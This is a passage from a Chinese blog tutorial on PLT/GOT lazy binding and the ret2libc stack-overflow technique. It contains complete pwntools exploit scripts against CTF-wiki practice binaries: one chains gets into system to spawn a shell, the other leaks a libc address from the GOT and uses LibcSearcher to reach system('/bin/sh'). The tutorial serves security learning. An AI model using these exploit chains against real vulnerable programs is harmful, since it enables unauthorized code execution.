<span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token comment">// 这一部分有关线程安全</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">int</span> flags <span class="token operator">=</span> DL_LOOKUP_ADD_DEPENDENCY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RTLD_SINGLE_THREAD_P<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">// 加锁</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">THREAD_GSCOPE_SET_FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    flags <span class="token operator">|=</span> DL_LOOKUP_GSCOPE_LOCK<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token comment">// 关键部分 —— 查找符号</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span><span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                               version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token comment">// 完成查找操作，解除锁</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RTLD_SINGLE_THREAD_P<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">THREAD_GSCOPE_RESET_FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token comment">// 之前拿到的链接库的基址，现在还需要加上函数的偏移</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token function">SYMBOL_ADDRESS</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> false<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token comment">// 已经找到了对应的符号，就不需要去做上面的那些事情</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token function">SYMBOL_ADDRESS</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  result <span class="token operator">=</span> l<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>经过上面的步骤，我们能够获得所需要的函数的偏移。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">// 将对应的偏移写进 GOT 表里</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> refsym<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>完成这个步骤之后，解析过程完成。通过 GDB 调试可以看到，执行完函数 <code>_dl_fixup</code> 之后， <code>EAX</code> 的值就是 <code>puts</code> 的实际地址：</p><p><img loading="lazy" data-src="gdb2.jpg" alt=""></p><p>接下来函数经过了栈的清理和一部分恢复操作，将 EAX 的值写入栈顶并执行 <code>ret</code> ，可以看到程序 <code>ret</code> 之后就会进入 <code>puts</code> 函数执行。</p><p><img loading="lazy" data-src="gdb3.jpg" alt=""></p><p>在执行完 <code>puts</code> 函数之后，程序回到 <code>main</code> 函数继续执行。</p><pre><code> ► 0xf7dc0bfa &lt;puts+266&gt;    ret                                  &lt;0x804919f; main+41&gt;
    ↓
   0x804919f  &lt;main+41&gt;     add    esp, 0x10
</code></pre><p>接下来程序运行到第二次调用 <code>puts</code> 函数时，我们使用 gdb 跟进：</p><p><img loading="lazy" data-src="gdb4.jpg" alt=""></p><p>可以看到程序会直接跳转进入了 <code>puts</code> 函数中执行，并不需要再进行一次 <code>_dl_runtime_resolve</code> 的操作。</p><p>实际上，如果程序在运行开始时就直接将动态链接库中的所有函数都进行这样的操作也是可以的，但是会带来巨大的性能损耗，所以会采用这样的折中的方式。在第一次调用函数的时候会进行一次 GOT 表的绑定，之后就不再需要了，这个操作被称为<strong>延迟绑定 (Lazy Binding)</strong>。</p><p><img loading="lazy" data-src="lazybinding.jpg" alt=""></p><h1 id="ret2libc"><a class="anchor" href="#ret2libc">#</a> ret2libc</h1><p>以<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">这道题</a>为例。</p><pre><code>$ pwn checksec ret2libc2
[*] '/home/syml/Temp/ret2libc2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>可以看到没有开启 Canary 和 PIE，但是开启了 NX。通过 IDA 检查发现程序里面没有 <code>/bin/sh</code> 这样的字符串。</p><p>使用 readelf 或者 IDA 都可以看到其中有 <code>system</code> 函数：</p><pre><code>重定位节 '.rel.plt' at offset 0x3c4 contains 11 entries:
 偏移量     信息    类型              符号值      符号名称
......
0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
......
0804a01c  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
......
</code></pre><p>我们使用 IDA 反编译可以看到 <code>main</code> 函数：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something surprise here, but I don't think it will work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>还是同样的栈溢出漏洞。采用和上次类似的方法可以看出返回地址相对的偏移为 112。</p><p>同时，我们还发现在 <code>.bss</code> 段存在一个变量 <code>buf2</code> ：</p><p><img loading="lazy" data-src="buf2.jpg" alt=""></p><p>接下来的问题是如何去构造 payload。一个思路是，溢出 <code>main</code> 函数使得它返回到 <code>gets@plt</code> ，读取数据 <code>/bin/sh</code> 放入 <code>buf2</code> ，接下来返回到 <code>system@plt</code> ，将 <code>buf2</code> 的内容作为参数传入。</p><p>通过这个思路我们构造 payload：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span></pre></td></tr><tr><td data-num="4"></td><td><pre>gets_addr <span class="token operator">=</span> <span class="token number">0x8048460</span></pre></td></tr><tr><td data-num="5"></td><td><pre>system_addr <span class="token operator">=</span> <span class="token number">0x8048490</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>成功。</p><p>其实这个例子并没有具体的体现出来前面扯了一大段的 GOT lazy binding 还有 glibc 的特点。<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">这个例子</a>相对来说更难一些。</p><p>程序的保护措施和前一个一样：</p><pre><code>$ pwn checksec ret2libc3
[*] '/home/syml/Temp/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>但是查看这里的重定位表就会发现，没有 <code>system</code> 函数的重定位信息：</p><pre><code>重定位节 '.rel.plt' at offset 0x3ac contains 10 entries:
 偏移量     信息    类型              符号值      符号名称
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   time@GLIBC_2.0
0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a01c  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a020  00000607 R_386_JUMP_SLOT   00000000   srand@GLIBC_2.0
0804a024  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a028  00000807 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0
0804a02c  00000907 R_386_JUMP_SLOT   00000000   rand@GLIBC_2.0
0804a030  00000a07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
</code></pre><p>接下来拖进 IDA 看一下：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里有一个背景知识，glibc 中各个函数之间相对偏移是固定的 —— 我们知道了一个函数的偏移也就会知道其他所有函数的偏移。同时 glibc 中也有字符串 <code>/bin/sh</code> ，我们也可以去获得这个字符串的偏移。现有的工具包括了<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher"> python 模块</a>和<a target="_blank" rel="noopener" href="https://libc.rip/">在线网站</a>等。</p><p>那么问题就是怎么样去泄漏函数的偏移。另一个问题又在于，因为 GOT 的延迟绑定特点，我们需要读取一个已经执行过了一次的函数的偏移才行。</p><p>那么，我们选择读取 <code>__libc_start_main</code> 函数的 GOT。payload 构造如下（在本机上跑真的会碰到各种奇奇怪怪的问题）</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin">file</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>puts <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>libc_start_got <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>start <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># 返回到 puts 函数，输出_libc_start_main 的 GOT，并跳转到_start 重新执行程序。</span></pre></td></tr><tr><td data-num="13"></td><td><pre>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"!?"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_got<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Leak glibc got addr, return to start"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>libc_start_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"addr: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> libc_start_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>base <span class="token operator">=</span> libc_start_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>sys_addr <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>bin_addr <span class="token operator">=</span> base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment"># 利用。</span></pre></td></tr><tr><td data-num="27"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="参考资料"><a class="anchor" href="#参考资料">#</a> 参考资料</h1><p>[1] <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">CTFWiki 栈溢出 - 基本 ROP</a></p><p>[2] <a target="_blank" rel="noopener" href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Executable and Linkable Format(ELF) Specification</a></p><div class="tags"><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"><i class="ic i-tag"></i>栈溢出</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-eye"></i></span><span class="text">总访问量：</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="/2022/03/30/stackoverflow-ret2libc/">加载中...</span></span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2025-09-10 14:48:49" itemprop="dateModified" datetime="2025-09-10T14:48:49+08:00">2025-09-10</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>神隐陌路/symlPigeon<i class="ic i-at"><em>@</em></i>symlpigeon's little gensokyo</li><li class="link"><strong>本文链接：</strong><a href="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/" title="栈溢出，ret2libc">http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/03/28/stackoverflow-learn/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;bgimgs&#x2F;8f9c6cc1ly8h18bgj8tg9j21590nstbw.jpg" title="关于栈溢出的一些东西（基本的）"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>Pwn</span><h3>关于栈溢出的一些东西（基本的）</h3></a></div><div class="item right"><a href="/2022/04/07/typora-reverse-engineering/" rel="next" itemprop="url" data-background-image="&#x2F;assets&#x2F;bgimgs&#x2F;8f9c6cc1ly8h18bzf3chhj20xc0m8425.jpg" title="针对Typora的逆向分析"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>实践</span><h3>针对Typora的逆向分析</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#plt%E5%92%8Cgot%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">PLT 和 GOT 表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc"><span class="toc-number">2.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/03/28/stackoverflow-learn/" rel="bookmark" title="关于栈溢出的一些东西（基本的）">关于栈溢出的一些东西（基本的）</a></li><li class="active"><a href="/2022/03/30/stackoverflow-ret2libc/" rel="bookmark" title="栈溢出，ret2libc">栈溢出，ret2libc</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="神隐陌路/symlPigeon" src="/assets/avatar.png"><p class="name" itemprop="name">神隐陌路/symlPigeon</p><div class="description" itemprop="description">夢違え、幻の朝靄の世界の記憶を</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">51</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">36</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">45</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/symlpigeon" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;symlpigeon"><i class="ic i-github"></i></a><a target="_blank" rel="noopener" href="https://music.163.com/#/user/home?id=540913144" class="item music" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;540913144"><i class="ic i-cloud-music"></i></a><a href="mailto:2163953074@qq.com" class="item email" title="mailto:2163953074@qq.com"><i class="ic i-envelope"></i></a><a target="_blank" rel="noopener" href="https://stackoverflow.com/users/20091462/symlpigeon" class="item stackoverflow" title="https:&#x2F;&#x2F;stackoverflow.com&#x2F;users&#x2F;20091462&#x2F;symlpigeon"><i class="ic i-stack-overflow"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="#" onclick="return!1"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/statistics/" rel="section"><i class="ic i-clock"></i>统计</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/04/07/typora-reverse-engineering/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/03/28/stackoverflow-learn/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; 2021 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">神隐陌路/symlPigeon @ Another Gensokyo</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">421k 字</span><span class="post-meta-divider"> | 